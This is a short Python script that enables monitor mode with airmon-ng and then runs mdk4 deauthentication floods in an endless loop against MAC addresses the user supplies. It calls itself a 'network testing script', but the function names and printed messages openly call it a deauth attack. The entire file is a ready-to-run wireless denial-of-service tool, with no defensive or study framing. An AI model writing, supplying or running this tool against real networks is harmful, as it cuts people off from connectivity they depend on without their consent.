import subprocess

def start_monitor_mode(interface):
    try:
        subprocess.run(["airmon-ng", "start", interface])
        return interface + "mon"
    except FileNotFoundError:
        print("Error: airmon-ng not found. Make sure you have aircrack-ng suite installed.")
        return None

def send_deauth_attack(interface, target_macs):
    try:
        while True:
            for target_mac in target_macs:
                subprocess.run(["mdk4", interface, "d", "-c", "1", "-w", "10", "-n", target_mac])
                print("Deauth attack sent to target MAC:", target_mac)
    except KeyboardInterrupt:
        print("Terminating the deauth attack.")

if __name__ == "__main__":
    print("Welcome to the network testing script!")
    user_interface = input("Please enter the name of your wireless interface: ")
    monitor_interface = start_monitor_mode(user_interface)

    if monitor_interface:
        target_macs_input = input("Please enter the target MAC addresses separated by commas: ")
        target_macs = [mac.strip() for mac in target_macs_input.split(",")]

        send_deauth_attack(monitor_interface, target_macs)
    else:
        print("Exiting the script.")
